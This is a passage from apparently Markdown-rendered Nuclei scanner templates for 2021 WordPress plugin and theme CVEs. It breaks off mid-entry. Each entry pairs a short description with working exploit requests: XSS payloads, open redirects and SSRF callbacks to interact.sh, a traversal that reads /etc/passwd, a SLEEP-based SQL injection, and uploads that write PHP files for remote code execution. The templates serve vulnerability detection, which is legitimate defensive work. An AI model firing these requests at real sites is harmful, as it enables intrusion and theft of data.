option_page=iqblockcountry-settings-group&action=update&_wpnonce={{nonce}}&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Foptions-general.php%3Fpage%3Diq-block-country%2Flibs%2Fblockcountry-settings.php&blockcountry_blockmessage=test</textarea><script>alert(document.domain)</script>&blockcountry_redirect=2&blockcountry_redirect_url=&blockcountry_header=on&blockcountry_nrstatistics=15&blockcountry_daysstatistics=30&blockcountry_geoapikey=&blockcountry_apikey=&blockcountry_ipoverride=NONE&blockcountry_debuglogging=on

```

### Step - 4

```
GET /wp-admin/options-general.php?page=iq-block-country%2Flibs%2Fblockcountry-settings.php HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. contains(all_headers_4, "text/html")
  2. status_code_4 == 200
  3. contains(body_4, 'blockcountry_blockmessage\">test\</textarea>\<script>alert(document.domain)\</script>')
  4. contains(body_4, '\<h3>Block type\</h3>')
- condition - and

### Extractors

**Type - regex**

- name - nonce
- group - 1
- regex
  1. name="\_wpnonce" value="([0-9a-zA-Z]+)"
- internal - True

---

# WordPress Pro Real Estate 7 Theme \<3.1.1 - Cross-Site Scripting

## Description

- WordPress Pro Real Estate 7 theme before 3.1.1 contains a reflected cross-site scripting vulnerability. It does not properly sanitize the ct_community parameter in its search listing page before outputting it back.

- severity - medium
- tags - cve,cve2021,xss,wordpress,wpscan

## Requests

### Step - 1

```
GET /?ct_mobile_keyword&ct_keyword&ct_city&ct_zipcode&search-listings=true&ct_price_from&ct_price_to&ct_beds_plus&ct_baths_plus&ct_sqft_from&ct_sqft_to&ct_lotsize_from&ct_lotsize_to&ct_year_from&ct_year_to&ct_community=%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E&ct_mls&ct_brokerage=0&lat&lng HTTP/1.1
Host: {{Hostname}}
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

```

### Matchers

**Type - word**

- words
  1. \<script>alert(document.domain);\</script>
  2. /wp-content/themes/realestate
- part - body
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress AcyMailing \<7.5.0 - Open Redirect

## Description

- WordPress AcyMailing plugin before 7.5.0 contains an open redirect vulnerability due to improper sanitization of the redirect parameter. An attacker turning the request from POST to GET can craft a link containing a potentially malicious landing page and send it to the user.
- severity - medium
- tags - wpscan,wordpress,cve,cve2021,redirect,wp-plugin

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?page=acymailing_front&ctrl=frontusers&noheader=1&user[email]=example@mail.com&ctrl=frontusers&task=subscribe&option=acymailing&redirect=https://interact.sh&ajax=0&acy_source=widget%202&hiddenlists=1&acyformname=formAcym93841&acysubmode=widget_acym

### Matchers

**Type - regex**

- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh._$
- part - header

---

# Popup by Supsystic \<1.10.5 - Cross-Site scripting

## Description

- WordPress Popup by Supsystic before 1.10.5 did not sanitize the tab parameter of its options page before outputting it in an attribute, leading to a reflected cross-site scripting issue.
- severity - medium
- tags - wpscan,packetstorm,wordpress,cve,cve2021,wp-plugin

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin.php?page=popup-wp-supsystic&tab=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

### Matchers

**Type - word**

- words
  1. \</script>\<script>alert(document.domain)\</script>
- condition - and

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. text/html
- part - header

---

# FV Flowplayer Video Player WordPress plugin - Authenticated Cross-Site Scripting

## Description

- The FV Flowplayer Video Player WordPress plugin is vulnerable to Reflected Cross-Site Scripting via the player_id parameter found in the ~/view/stats.php file which allows attackers to inject arbitrary web scripts in versions 7.5.0.727 - 7.5.2.727.
- severity - medium
- tags - wpscan,cve,cve2021,wordpress,xss,wp,wp-plugin,authenticated

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/admin.php?page=fv_player_stats&player_id=1</script><script>alert(document.domain)</script> HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. \</script>\<script>alert(document.domain)\</script>
  2. \<h1>FV Player Stats\</h1>
- condition - and

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# Onair2 \< 3.9.9.2 & KenthaRadio \< 2.0.2 - Remote File Inclusion/Server-Side Request Forgery

## Description

- Onair2 \< 3.9.9.2 and KenthaRadio \< 2.0.2 have exposed proxy functionality to unauthenticated users. Sending requests to this proxy functionality will have the web server fetch and display the content from any URI, allowing remote file inclusion and server-side request forgery.
- severity - critical
- tags - wordpress,lfi,ssrf,oast,wpscan,cve,cve2021

## Requests

### Step - 1

```
GET /?qtproxycall=http://{{interactsh-url}} HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. http

**Type - status**

- status
  1. 200

---

# WordPress Jannah Theme \<5.4.5 - Cross-Site Scripting

## Description

- WordPress Jannah theme before 5.4.5 contains a reflected cross-site scripting vulnerability. It does not properly sanitize the 'query' POST parameter in its tie_ajax_search AJAX action.
- severity - medium
- tags - cve,cve2021,wordpress,xss,wp-theme,wpscan

## Requests

### Step - 1

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Accept: */*
Content-Type: application/x-www-form-urlencoded

action=tie_ajax_search&query[]=</script><script>alert(document.domain)</script>

```

### Matchers

**Type - word**

- words
  1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Transposh Translation \<1.0.8 - Cross-Site Scripting

## Description

- WordPress Transposh Translation plugin before 1.0.8 contains a reflected cross-site scripting vulnerability. It does not sanitize and escape the a parameter via an AJAX action (available to both unauthenticated and authenticated users when the curl library is installed) before outputting it back in the response.
- severity - medium
- tags - cve2021,wordpress,wp-plugin,xss,wp,wpscan,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?action=tp_tp&e=g&m=s&tl=en&q=\<img%20src%3dx%20onerror%3dalert(document.domain)>

### Matchers

**Type - word**

- part - body
- words
  1. \<img src=x onerror=alert(document.domain)>
  2. {"result":
- condition - and

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress AnyComment \<0.3.5 - Open Redirect

## Description

- WordPress AnyComment plugin before 0.3.5 contains an open redirect vulnerability via an API endpoint which passes user input via the redirect parameter to the wp_redirect() function without being validated. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.

- severity - medium
- tags - redirect,anycomment,wpscan,cve,cve2021,wordpress,wp-plugin

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-json/anycomment/v1/auth/wordpress?redirect=https://interact.sh
- {{BaseURL}}/wp-json/anycomment/v1/auth/wordpress?redirect=https://interact.sh?a=https://interact.sh

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

**Type - status**

- status
  1. 302

---

# WordPress Contact Form 7 Skins \<=2.5.0 - Cross-Site Scripting

## Description

- WordPress Contact Form 7 Skins plugin 2.5.0 and prior contains a reflected cross-site scripting vulnerability. It does not sanitize and escape the tab parameter before outputting it back in an admin page.
- severity - medium
- tags - wpscan,cve,cve2021,wordpress,wp-plugin,xss,contactform,authenticated

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/admin.php?page=cf7skins&tab=%27%3E%3Cimg+src+onerror%3Dalert%28document.domain%29%3E HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. \<img src onerror=alert(document.domain)>' type='hidden

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress WooCommerce \<1.13.22 - Cross-Site Scripting

## Description

- WordPress WooCommerce before 1.13.22 contains a reflected cross-site scripting vulnerability via the slider import search feature because it does not properly sanitize the keyword GET parameter.
- severity - medium
- tags - cve,cve2021,xss,wp,wordpress,wp-plugin,authenticated,wpscan

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/edit.php?post_type=wcps&page=import_layouts&keyword="onmouseover%3Dalert%28document.domain%29%3B%2F%2F HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. value="\"onmouseover=alert(document.domain);//">
  2. PickPlugins Product Slider
- condition - and

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Imagements \<=1.2.5 - Arbitrary File Upload

## Description

- WordPress Imagements plugin through 1.2.5 is susceptible to arbitrary file upload which can lead to remote code execution. The plugin allows images to be uploaded in comments but only checks for the Content-Type in the request to forbid dangerous files. An attacker can upload arbitrary files by using a valid image Content-Type along with a PHP filename and code.

- severity - critical
- tags - cve,wp,unauth,imagements,wpscan,cve2021,fileupload,wordpress,wp-plugin,intrusive

## Requests

### Step - 1

```
POST /wp-comments-post.php HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIYl2Oz8ptq5OMtbU

------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="comment"

{{randstr}}
------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="author"

{{randstr}}
------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="email"

{{randstr}}@email.com
------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="url"

------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="checkbox"


yes
------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="naam"

{{randstr}}
------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="image"; filename="{{php}}"
Content-Type: image/jpeg

<?php echo 'CVE-2021-24236'; ?>

------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="submit"

Post Comment
------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="comment_post_ID"

{{post}}
------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="comment_parent"

0
------WebKitFormBoundaryIYl2Oz8ptq5OMtbU--

```

### Step - 2

```
GET /wp-content/plugins/imagements/images/{{php}} HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body_2
- words
  1. CVE-2021-24236

---

# WordPress Persian Woocommerce \<=5.8.0 - Cross-Site Scripting

## Description

- WordPress Persian Woocommerce plugin through 5.8.0 contains a cross-site scripting vulnerability. The plugin does not escape the s parameter before outputting it back in an attribute in the admin dashboard. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site and possibly steal cookie-based authentication credentials and launch other attacks.

- severity - medium
- tags - wp,xss,authenticated,wpscan,cve,cve2021,wordpress,wp-plugin

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/admin.php?page=persian-wc&s=xxxxx%22+accesskey%3DX+onclick%3Dalert%281%29+test%3D%22 HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. contains(all_headers_2, "text/html")
  2. status_code_2 == 200
  3. contains(body_2, 'accesskey=X onclick=alert(1) test=')
  4. contains(body_2, 'woocommerce_persian_translate')
- condition - and

---

# WordPress Ninja Forms \<3.4.34 - Open Redirect

## Description

- WordPress Ninja Forms plugin before 3.4.34 contains an open redirect vulnerability via the wp_ajax_nf_oauth_connect AJAX action, due to the use of a user-supplied redirect parameter and no protection in place. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.

- severity - medium
- tags - cve,cve2021,wordpress,redirect,wp-plugin,authenticated,wp,wpscan

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/admin-ajax.php?client_id=1&redirect=https://interact.sh&action=nf_oauth_connect HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. status_code_1 == 302
  2. status_code_2 == 302
  3. contains(all_headers_2, 'Location: https://interact.sh?client_id=1')
- condition - and

---

# Easy Social Feed \< 6.2.7 - Cross-Site Scripting

## Description

- Easy Social Feed \< 6.2.7 is susceptible to reflected cross-site scripting because the plugin does not sanitize and escape a parameter before outputting it back in an admin dashboard page, leading to it being executed in the context of a logged admin or editor.
- severity - medium
- tags - cve,cve2021,wordpress,wp-plugin,xss,authenticated,wpscan

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/admin.php?page=easy-facebook-likebox&access_token=a&type=</script><script>alert(document.domain)</script> HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. 'type' : '\</script>\<script>alert(document.domain)\</script>'

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# Plus Addons for Elementor Page Builder \< 4.1.10 - Open Redirect

## Description

- WordPress Plus Addons for Elementor Page Builder before 4.1.10 did not validate a redirect parameter on a specifically crafted URL before redirecting the user to it, leading to an open redirect issue.
- severity - medium
- tags - wp,wpscan,cve,cve2021,wordpress,redirect,wp-plugin,elementor

## Requests

### Step - 1

```
GET /?author=1 HTTP/1.1
Host: {{Hostname}}

```

### Step - 2

```
GET /wp-login.php?action=theplusrp&key=&redirecturl=http://interact.sh&forgoturl=http://interact.sh&login={{username}} HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

### Extractors

**Type - regex**

- part - body
- name - username
- internal - True
- group - 1
- regex
  1. Author:(?:[A-Za-z0-9 -\_="]+)?\<span(?:[A-Za-z0-9 -\_="]+)?>([A-Za-z0-9]+)\<\/span>

**Type - regex**

- part - header
- name - username
- internal - True
- group - 1
- regex
  1. ion: https:\/\/[a-z0-9.]+\/author\/([a-z]+)\/

---

# WordPress English Admin \<1.5.2 - Open Redirect

## Description

- WordPress English Admin plugin before 1.5.2 contains an open redirect vulnerability. The plugin does not validate the admin_custom_language_return_url before redirecting users to it. An attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - medium
- tags - cve2021,unauth,wpscan,wp-plugin,redirect,wordpress,wp,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?action=heartbeat&admin_custom_language_toggle=1&admin_custom_language_return_url=https://interact.sh

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# WordPress DZS Zoomsounds \<=6.50 - Local File Inclusion

## Description

- WordPress Zoomsounds plugin 6.45 and earlier allows arbitrary files, including sensitive configuration files such as wp-config.php, to be downloaded via the `dzsap_download` action using directory traversal in the `link` parameter.
- severity - high
- tags - wordpress,wp-plugin,zoomsounds,wpscan,packetstorm,cve,wp,cve2021,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/?action=dzsap_download&link=../../../../../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# WordPress Securimage-WP-Fixed \<=3.5.4 - Cross-Site Scripting

## Description

- WordPress Securimage-WP-Fixed plugin 3.5.4 and prior contains a cross-site scripting vulnerability due to the use of $\_SERVER['PHP_SELF'] in the ~/securimage-wp.php file, which allows attackers to inject arbitrary web scripts.
- severity - medium
- tags - wpscan,wordpress,cve,cve2021,wp-plugin,authenticated

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET //wp-admin/options-general.php/"></script><script>alert(document.domain)</script>/script%3E?page=securimage-wp-options%2F HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. \</script>\<script>alert(document.domain)\</script>

**Type - status**

- status
  1. 200

**Type - word**

- part - header
- words
  1. text/html

---

# AccessAlly \<3.5.7 - Sensitive Information Leakage

## Description

- WordPress AccessAlly plugin before 3.5.7 allows sensitive information leakage because the file \"resource/frontend/product/product-shortcode.php\" (which is responsible for the [accessally_order_form] shortcode) dumps serialize($\_SERVER), which contains all environment variables. The leakage occurs on all public facing pages containing the [accessally_order_form] shortcode, and no login or administrator role is required.
- severity - high
- tags - wordpress,cve,cve2021,wp-plugin,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}

### Matchers

**Type - word**

- words
  1. \<div id="accessally-testing-data"
- condition - and
- part - body

**Type - status**

- status
  1. 200

---

# WordPress Perfect Survey\<1.5.2 - SQL Injection

## Description

- Perfect Survey WordPress plugin before 1.5.2 does not validate and escape the question_id GET parameter before using it in a SQL statement in the get_question AJAX action, allowing unauthenticated users to perform SQL injection.

- severity - critical
- tags - cve,wpscan,cve2021,sqli,wp,wordpress,wp-plugin,unauth,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?action=get_question&question_id=1%20AND%20(SELECT%207242%20FROM%20(SELECT(SLEEP(4)))HQYx)

### Matchers

**Type - dsl**

- dsl
  1. duration>=4

**Type - word**

- part - header
- words
  1. wp-ps-session

**Type - status**

- status
  1. 404

---

# Yoast SEO \< 17.3 - Path Disclosure

## Description

- The plugin discloses the full internal path of featured images in posts via the wp/v2/posts REST endpoints which could help an attacker identify other vulnerabilities or help during the exploitation of other identified vulnerabilities.
- severity - medium
- tags - wpscan,wordpress,cve2021,wp-plugin,fpd,cve,wp

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-json/wp/v2/posts?per_page=1

### Matchers

**Type - regex**

- regex
  1. "path":"(._)/wp-content\\(._)","size

**Type - word**

- part - header
- words
  1. application/json

**Type - status**

- status
  1. 200

### Extractors

**Type - regex**

- part - body
- group - 1
- regex
  1. "path":"(._)/wp-content\\(._)","size

---

# WordPress Kaswara Modern VC Addons \<=3.0.1 - Arbitrary File Upload

## Description

- WordPress Kaswara Modern VC Addons plugin through 3.0.1 is susceptible to an arbitrary file upload. The plugin allows unauthenticated arbitrary file upload via the uploadFontIcon AJAX action, which can be used to obtain code execution. The supplied zipfile is unzipped in the wp-content/uploads/kaswara/fonts_icon directory with no checks for malicious files such as PHP.

- severity - critical
- tags - intrusive,unauth,fileupload,wpscan,cve,wordpress,wp-plugin,rce,cve2021,wp

## Requests

### Step - 1

```
POST /wp-admin/admin-ajax.php?action=uploadFontIcon HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=------------------------d3be34324392a708

--------------------------d3be34324392a708
Content-Disposition: form-data; name="fonticonzipfile"; filename="{{zip_file}}.zip"
Content-Type: application/octet-stream

{{hex_decode('504B03040A0000000000FA73F454B2333E07140000001400000006001C00')}}{{php_file}}{{hex_decode('555409000366CBD76267CBD76275780B000104F50100000414000000')}}{{php_cmd}}{{hex_decode('0A504B01021E030A00000000002978F454E49BC1591300000013000000060018000000000001000000A48100000000')}}{{php_file}}{{hex_decode('555405000366CBD76275780B000104F50100000414000000504B050600000000010001004C000000530000000000')}}
--------------------------d3be34324392a708
Content-Disposition: form-data; name="fontsetname"

{{zip_file}}
--------------------------d3be34324392a708
Content-Disposition: form-data; name="action"

uploadFontIcon
--------------------------d3be34324392a708--

```

### Step - 2

```
GET /wp-content/uploads/kaswara/fonts_icon/{{zip_file}}/{{php_file}} HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body_1
- words
  1. wp-content/uploads/kaswara/fonts_icon/{{zip_file}}/style.css

**Type - word**

- part - body_2
- words
  1. phpinfo()

**Type - status**

- status
  1. 200

---

# WordPress Under Construction \<1.19 - Cross-Site Scripting

## Description

- WordPress Under Construction plugin before 1.19 contains a cross-site scripting vulnerability. The plugin echoes out the raw value of `$GLOBALS['PHP_SELF']` in the ucOptions.php file on certain configurations, including Apache+modPHP.

- severity - medium
- tags - cve,cve2021,wp-plugin,wpscan,wordpress,wp,xss,authenticated

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In

```

### Step - 2

```
GET /wp-admin/admin.php/"><script>alert(document.domain)</script>/?page=under-construction HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. action="/wp-admin/admin.php/">\<script>alert(document.domain)\</script>
  2. under-construction
- condition - and

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Mediumish Theme \<=1.0.47 - Cross-Site Scripting

## Description

- WordPress Mediumish theme 1.0.47 and prior contains an unauthenticated reflected cross-site scripting vulnerability. The 's' GET parameter is not properly sanitized by the search feature before it is output back on the page.
- severity - medium
- tags - cve,cve2021,mediumish,xss,wordpress,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/?post_type=post&s=%22%3E%3Cscript%3Ealert(/{{randstr}}/)%3C/script%3E

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. \<script>alert(/{{randstr}}/)\</script>
  2. Sorry, no posts matched your criteria.
- part - body
- condition - and

**Type - word**

- words
  1. text/html
- part - header

---

# WordPress Modern Events Calendar Lite \<5.16.5 - Sensitive Information Disclosure

## Description

- WordPress Modern Events Calendar Lite before 5.16.5 does not properly restrict access to the export files, allowing unauthenticated users to exports all events data in CSV or XML format.
- severity - high
- tags - cve2021,wpscan,packetstorm,wordpress,wp-plugin,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin.php?page=MEC-ix&tab=MEC-export&mec-ix-action=export-events&format=csv

### Matchers

**Type - word**

- words
  1. mec-events
  2. text/csv
- condition - and
- part - header

**Type - status**

- status
  1. 200

---

# WordPress Super Socializer \<7.13.30 - Cross-Site Scripting

## Description

- WordPress Super Socializer plugin before 7.13.30 contains a reflected cross-site scripting vulnerability. It does not sanitize and escape the urls parameter in its the_champ_sharing_count AJAX action (available to both unauthenticated and authenticated users) before outputting it back in the response.
- severity - medium
- tags - cve,cve2021,wpscan,xss,wp,wp-plugin,wordpress

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?action=the_champ_sharing_count&urls[]=\<img%20src=x%20onerror=alert(document.domain)>

### Matchers

**Type - word**

- part - body
- words
  1. {"facebook_urls":[["\<img src=x onerror=alert(document.domain)>"]]

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# The Code Snippets WordPress Plugin \< 2.14.3 - Cross-Site Scripting

## Description

- The Wordpress plugin Code Snippets before 2.14.3 does not escape the snippets-safe-mode parameter before reflecting it in attributes, leading to a reflected cross-site scripting issue.
- severity - medium
- tags - authenticated,wpscan,cve,cve2021,xss,wp,wordpress,wp-plugin

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/admin.php?page=snippets&snippets-safe-mode%5B0%5D=%22+style%3Danimation-name%3Arotation+onanimationstart%3Dalert%28document.domain%29+x%3D HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. " style=animation-name:rotation onanimationstart=alert(document.domain) x
  2. Snippets
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress Fancy Product Designer \<4.6.9 - Arbitrary File Upload

## Description

- WordPress Fancy Product Designer plugin before 4.6.9 is susceptible to an arbitrary file upload. An attacker can upload malicious files and execute code on the server, modify data, and/or gain full control over a compromised system without authentication.

- severity - critical
- tags - wordpress,wp,seclists,cve,wpscan,cve2021,rce,wp-plugin,fancyproduct

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/fancy-product-designer/inc/custom-image-handler.php

### Matchers

**Type - word**

- part - body
- words
  1. {"error":"You need to define a directory

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WPCargo \< 6.9.0 - Unauthenticated Remote Code Execution

## Description

- The WPCargo Track & Trace WordPress plugin before 6.9.0 contains a file which could allow unauthenticated attackers to write a PHP file anywhere on the web server, leading to RCE.

- severity - critical
- tags - rce,wpcargo,unauth,cve,cve2021,wordpress,wp,wp-plugin,wpscan

## Requests

### Step - 1

```
GET /wp-content/plugins/wpcargo/includes/{{randstr}}.php HTTP/1.1
Host: {{Hostname}}

```

### Step - 2

```
GET /wp-content/plugins/wpcargo/includes/barcode.php?text=x1x1111x1xx1xx111xx11111xx1x111x1x1x1xxx11x1111xx1x11xxxx1xx1xxxxx1x1x1xx1x1x11xx1xxxx1x11xx111xxx1xx1xx1x1x1xxx11x1111xxx1xxx1xx1x111xxx1x1xx1xxx1x1x1xx1x1x11xxx11xx1x11xx111xx1xxx1xx11x1x11x11x1111x1x11111x1x1xxxx&sizefactor=.090909090909&size=1&filepath={{randstr}}.php HTTP/1.1
Host: {{Hostname}}

```

### Step - 3

```
POST /wp-content/plugins/wpcargo/includes/{{randstr}}.php?1=var_dump HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

2={{md5(num)}}

```

### Matchers

**Type - dsl**

- dsl
  1. status_code_1 != 200
  2. status_code_2 == 200
  3. status_code_3 == 200
  4. contains(body_3, md5(num))
  5. contains(body_3, 'PNG')
- condition - and

---

# WordPress Domain Check \<1.0.17 - Cross-Site Scripting

## Description

- WordPress Domain Check plugin before 1.0.17 contains a reflected cross-site scripting vulnerability. It does not sanitize and escape the domain parameter before outputting it back in the page.
- severity - medium
- tags - wpscan,cve,cve2021,xss,wp,wordpress,wp-plugin,authenticated

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/admin.php?page=domain-check-profile&domain=test.foo<script>alert(document.domain)</script> HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. \<script>alert(document.domain)\</script>
  2. Domain Check
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress FeedWordPress \< 2022.0123 - Authenticated Cross-Site Scripting

## Description

- The plugin is affected by a cross-site scripting vulnerability within the "visibility" parameter.

- severity - medium
- tags - cve,cve2021,wordpress,xss,wp-plugin,authenticated,wpscan

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/admin.php?page=feedwordpress%2Fsyndication.php&visibility=%22%3E%3Cimg+src%3D1+onerror%3Dalert%28document.domain%29%3E HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. \<img src=1 onerror=alert(document.domain)>

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress PhastPress \<1.111 - Open Redirect

## Description

- WordPress PhastPress plugin before 1.111 contains an open redirect vulnerability. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.

- severity - medium
- tags - cve2021,redirect,wpscan,wordpress,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/phastpress/phast.php?service=scripts&src=https%3A%2F%2Finteract.sh

### Matchers

**Type - regex**

- regex
